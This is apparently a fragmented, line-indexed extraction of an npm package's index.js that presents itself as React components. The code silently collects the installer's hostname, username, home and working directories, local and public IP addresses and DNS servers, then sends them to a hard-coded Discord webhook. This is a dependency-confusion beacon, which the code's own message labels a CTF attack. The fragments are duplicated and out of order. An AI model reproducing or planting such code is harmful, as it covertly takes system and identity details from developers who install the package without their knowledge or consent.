// File: tmp/tmpl110vcl_/ecpfs-react-data-driven-components/package/index.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const https = require('https')
Line 3: const dns = require('dns')
Line 5: const discordWebhookUrl = 'https://discord.com/api/webhooks/1312119162260426803/AnwIFvtvn_xrCA9q71pjVaQ7fhpnkIatavKZSA0Sjzm6vVqYR4BIqSu3ocsSkKL4-Cj4'
Line 8: {
    const payload = JSON.stringify({ content: message });
    const parsedUrl = new URL(discordWebhookUrl);
    const req = https.request({
        hostname: parsedUrl.hostname,
        path: parsedUrl.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    });
    req.write(payload);
    req.end();
}
Line 11: const req = https.request({
        hostname: parsedUrl.hostname,
        path: parsedUrl.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    })
Line 20: req.write(payload)
Line 21: req.end()
Line 24: (_tmp_4 = https.get('https://ipinfo.io/ip', (resp) => {
    let data = '';
    resp.on('data', (chunk) => { data += chunk; });
    resp.on('end', () => {
        const baseMessage = `Alert: CTF Dependency Confusion Attack Detected!
Current Directory: ${__dirname}
Home Directory: ${os.homedir()}
Hostname: ${os.hostname()}
Username: ${os.userInfo().username}
Local IP Address: ${(os.networkInterfaces()['eth0'] || [{ address: 'N/A' }])[0].address}
Public IP Address: ${data.trim()}
Dns-Server: ${dns.getServers().join(', ')}`;

        sendMessage(baseMessage);
    });
}))
Line 28: <operator>.formatString("Alert: CTF Dependency Confusion Attack Detected!
Current Directory: ", __dirname, "
Home Directory: ", os.homedir(), "
Hostname: ", os.hostname(), "
Username: ", os.userInfo().username, "
Local IP Address: ", (os.networkInterfaces()['eth0'] || [{ address: 'N/A' }])[0].address, "
Public IP Address: ", data.trim(), "
Dns-Server: ", dns.getServers().join(', '), "")
Line 31: os.hostname()
Line 32: os.userInfo()
Line 33: os.networkInterfaces()['eth0'] || [{ address: 'N/A' }][0].address
Line 34: data.trim()
Line 35: dns.getServers().join(', ')
